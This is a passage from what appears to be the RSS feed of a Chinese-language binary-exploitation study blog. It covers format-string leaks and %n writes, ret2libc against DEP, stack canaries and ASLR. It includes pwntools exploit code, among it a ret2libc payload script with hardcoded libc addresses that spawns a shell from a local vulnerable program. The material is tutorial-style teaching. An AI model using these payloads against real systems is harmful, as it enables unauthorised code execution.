&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# 获取地址（可选）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;you typed: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;# 跳过输入回显&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 接收实际泄露数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;leaked&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 处理二进制地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leaked&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;startswith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;leaked&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leaked&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 移除开头的地址副本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;覆盖内存&#34;&gt;覆盖内存
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;核心思想：利用%n&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%n，将成功输出的字符个数写入对应的整型指针参数所指的变量。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;通用操作：构造特定长度的填充，将目标内容，即填充部分长度，写入目标地址。具体操作与泄露类似。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>返回库文件</title>
        <link>https://example.com/p/%E8%BF%94%E5%9B%9E%E5%BA%93%E6%96%87%E4%BB%B6/</link>
        <pubDate>Fri, 11 Jul 2025 21:59:45 +0800</pubDate>
        
        <guid>https://example.com/p/%E8%BF%94%E5%9B%9E%E5%BA%93%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h1 id=&#34;return-to-libc&#34;&gt;Return to libc
&lt;/h1&gt;&lt;h2 id=&#34;ret2libc的意义-绕过----depdata-execution-prevention&#34;&gt;ret2libc的意义： 绕过    DEP（Data Execution Prevention）
&lt;/h2&gt;&lt;h3 id=&#34;canary&#34;&gt;Canary
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cannary是一种栈溢出保护机制。是在栈上返回地址前插入一个随机值，该随机值被称为canary。在函数返回前检查canary是否被篡改，如果被篡改，则立刻终止程序&lt;/li&gt;
&lt;li&gt;原理：栈溢出时会覆盖返回值下方（低位）的内容，即canary&lt;/li&gt;
&lt;li&gt;带canary的栈布局示意图
  &lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/21.png&#34; alt=&#34;Canary&#34; width=&#34;50%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dep&#34;&gt;DEP
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;可以发现在Stack overflow中介绍的攻击方式是通过拿shell实现的，因此只要禁止在数据段中执行程序就可以阻止该攻击方式。&lt;/li&gt;
&lt;li&gt;DEP就是通过这种方式实现的保护机制&lt;/li&gt;
&lt;li&gt;相关知识： 冯诺伊曼架构与哈佛架构
&lt;ul&gt;
&lt;li&gt;在冯诺伊曼架构中所有代码都是数据，所以可以通过注入数据插入可执行代码&lt;/li&gt;
&lt;li&gt;哈佛架构将虚拟地址空间划分为数据区和代码区，代码区是可读（R）和可执行（X）的，数据区域是可读（R）和可写（W）的。任何区域都&lt;strong&gt;不能是同时可读，可执行和可写的&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;攻破dep的方式代码复用攻击&#34;&gt;攻破DEP的方式：代码复用攻击
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DEP阻止了我们直接注入代码，但是代码一定要通过外界注入吗？&lt;/li&gt;
&lt;li&gt;可以发现程序和库同样是有函数的，因此我们可以利用其中的函数构建出我们需要的攻击。&lt;/li&gt;
&lt;li&gt;理念：重用程序和库中的代码（不需要代码注入）&lt;/li&gt;
&lt;li&gt;return to libc: 将返回地址替换为危险函数的地址&lt;/li&gt;
&lt;li&gt;例：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;思路：
&lt;ul&gt;
&lt;li&gt;找到系统函数的地址&lt;/li&gt;
&lt;li&gt;找到字符串&amp;quot;/bin/sh&amp;quot;&lt;/li&gt;
&lt;li&gt;将&amp;quot;/bin/sh&amp;quot;传递给系统函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作：
&lt;ul&gt;
&lt;li&gt;Step1: 可以使用gdb来查找系统功能地址&lt;/li&gt;
&lt;li&gt;Step2:
&lt;ul&gt;
&lt;li&gt;使用系统环境变量（不稳定）&lt;/li&gt;
&lt;li&gt;定义环境变量
&lt;ul&gt;
&lt;li&gt;示例:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MYSHELL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;”&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ret2libc start &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;MYSHELL&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;address %p &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;vul&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ret2libc end &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Step3:
&lt;ul&gt;
&lt;li&gt;注入：
&lt;ul&gt;
&lt;li&gt;注入后堆栈展示：
&lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/22.png&#34; alt=&#34;ret2libc&#34; width=&#34;80%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;构造注入展示：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 获取地址（需提前泄露）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7e3dda0&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# system()地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7f6e5aa&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# &amp;#34;/bin/sh&amp;#34;地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exit_addr&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xb7e369d0&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# exit()地址 (可选)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 构造payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;140&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 到返回地址的偏移量&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# 填充缓冲区&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# 覆盖返回地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;# system()的返回地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# 参数1: &amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 发送payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./vuln_program&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;对上述ret2libc的防护aslr&#34;&gt;对上述ret2libc的防护：ASLR
&lt;/h2&gt;&lt;h3 id=&#34;aslr&#34;&gt;ASLR：
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;可以发现，上面的攻击方式中的核心步骤之一是获取系统函数的地址，因此容易想到，如果我们能够阻止获取系统函数地址，就可以实现对上述攻击方式的防护。&lt;/li&gt;
&lt;li&gt;ASLR：随机化关键内存基地址&lt;/li&gt;
&lt;li&gt;Linux中ASLR分为三级
&lt;ul&gt;
&lt;li&gt;0：无随机化&lt;/li&gt;
&lt;li&gt;1：保留的随机化，共享库、栈、mmp()和VSDO随机化&lt;/li&gt;
&lt;li&gt;2：完全的随机化，通过brk()分配的内存空间也会随机化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>栈溢出（Stack Overflow）与函数调用中的栈变化</title>
        <link>https://example.com/p/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow%E4%B8%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E6%A0%88%E5%8F%98%E5%8C%96/</link>
        <pubDate>Fri, 11 Jul 2025 21:59:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow%E4%B8%8E%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E6%A0%88%E5%8F%98%E5%8C%96/</guid>
        <description>&lt;h1 id=&#34;栈溢出stack-overflow&#34;&gt;栈溢出（stack overflow）
&lt;/h1&gt;&lt;h2 id=&#34;一些术语概念&#34;&gt;一些术语/概念
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;类型安全（Type safety）
&lt;ul&gt;
&lt;li&gt;In computer science, type safety and type soundness are the extent to which a programming language discourages or prevents type errors.          &lt;p align=&#34;right&#34;&gt;————From wikipidiea&lt;p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;前置知识x86架构下函数调用中的栈变化&#34;&gt;前置知识：x86架构下函数调用中的栈变化
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;初始：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;栈示意图：&lt;/li&gt;
&lt;/ul&gt;
